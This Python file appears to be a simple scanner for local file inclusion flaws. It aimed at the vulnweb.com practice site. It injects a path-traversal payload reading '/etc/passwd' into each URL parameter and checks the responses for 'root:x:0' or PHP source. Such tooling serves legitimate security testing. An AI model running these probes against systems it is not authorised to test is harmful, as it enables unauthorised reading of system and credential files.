import urllib.parse

import validators
from urllib.parse import urlparse,parse_qs
import requests

class LFI:

    payloads=["showimage.php", "../../../../../../../etc/passwd"]
    high_strings=["root:x:0", "root:x:0", "<?php"]

    def __init__(self, url):
        self.url = url

    def check_url(self):
        return validators.url(self.url)

        """Lets see if url has a query string parameters or not"""
    def contain_params(self):
        if self.check_url():
            parsed_url = urlparse(self.url)
            query = parsed_url.query
            parameters = parse_qs(query)
            if bool(parameters) is False and parameters is not None:
                return False
            else:
                return True
                #return {k:v[0] if v and len(v) == 1 else v for k,v in parameters.items()}

    def check_LFI(self, is_param):
        query_arg = ""
        LFI_url = self.url
        arguments = []
        if is_param is not False:
            parsed_url = urlparse(self.url)
            parameters = parse_qs(parsed_url.query)
            for parameter in parameters:
                for P in LFI.payloads:
                    current_value = parameters[parameter]
                    parameters[parameter] = P
                    new_parts = list(parsed_url)
                    new_parts[4] = urllib.parse.urlencode(parameters)
                    build_url = urllib.parse.urlunparse(new_parts)

                    data = requests.get(build_url).text
                    print(data)

                    for high_string in LFI.high_strings:
                        if high_string in data:
                            print("LFI Found")

                    parameters[parameter] = current_value





        else:
            print("Bu dict boş")

if __name__ == '__main__':
    scanner = LFI("http://testphp.vulnweb.com/showimage.php?file=showimage.php&wayback=test")
    checker = scanner.contain_params()
    scanner.check_LFI(checker)

